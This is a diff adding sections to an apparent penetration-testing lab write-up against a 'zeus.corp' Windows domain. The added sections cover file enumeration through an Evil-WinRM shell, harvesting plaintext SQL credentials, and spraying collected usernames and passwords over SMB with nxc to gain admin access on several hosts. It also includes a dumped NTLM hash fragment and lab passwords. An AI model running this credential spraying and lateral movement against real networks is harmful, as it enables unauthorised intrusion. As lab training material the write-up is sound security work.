@@ -73,3 +73,65 @@ Administrator:500:...:a1fcb4118dfcbf52a53d6299aab57055:::
 zeus\o.foller:EarlyMorningFootball777
 ```
 ![alt text](image-2.png)
+
+## File Enumeration
+
+```bash
+# Found interesting SQL Directory
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\
+*Evil-WinRM* PS C:\> ls
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         12/7/2019   9:14 AM                PerfLogs
+d-r---         2/20/2025   9:13 PM                Program Files
+d-r---        11/19/2020   7:46 AM                Program Files (x86)
+d-----          4/6/2026   5:46 PM                SQL
+d-r---          4/6/2026   5:11 PM                Users
+d-----          4/6/2026   5:46 PM                Windows
+-a----          4/6/2026   5:07 PM           2663 output.txt
+```
+```bash
+type connection.sql
+$SqlServer    = 'DC01'
+$Database     = 'master'
+$SqlAuthLogin = 'zeus.corp\db_user'
+$SqlAuthPw    = 'Password123!'
+# query to show changes
+$Query = '
+SELECT @@SERVERNAME AS [ServerName]
+    , des.login_name
+    , DB_NAME()   AS [DatabaseName]
+    , dec.net_packet_size
+    , @@LANGUAGE  AS [Language]
+    , des.program_name
+    , des.host_name
+FROM sys.dm_exec_connections dec
+JOIN sys.dm_exec_sessions des ON dec.session_id = des.session_id
+WHERE dec.session_id = @@SPID
+'
+# Found creds db_user:Password123!
+```
+
+## Create User and Password file and run against known machines
+```bash
+nxc smb 192.168.158.158-160 -u users.txt -p passwords.txt --continue-on-success 
+
+# Results
+SMB         192.168.158.159 445    CLIENT01         [+] zeus.corp\Eric.Wallows:EricLikesRunning800 (Pwn3d!)
+SMB         192.168.158.160 445    CLIENT02         [+] zeus.corp\o.foller:EarlyMorningFootball777 (Pwn3d!)
+SMB         192.168.158.159 445    CLIENT01         [+] zeus.corp\db_user:Password123! 
+SMB         192.168.158.158 445    DC01             [+] zeus.corp\db_user:Password123! 
+SMB         192.168.158.160 445    CLIENT02         [+] zeus.corp\db_user:Password123! 
+
+# CLIENT01 ADMIN: Eric.Wallows:EricLikesRunning800
+# CLIENT02 ADMIN: o.foller:EarlyMorningFootball777
+# DC01 ADMIN: Unknown
+```
+
+## Proceed to CLIENT02 (.160)
+
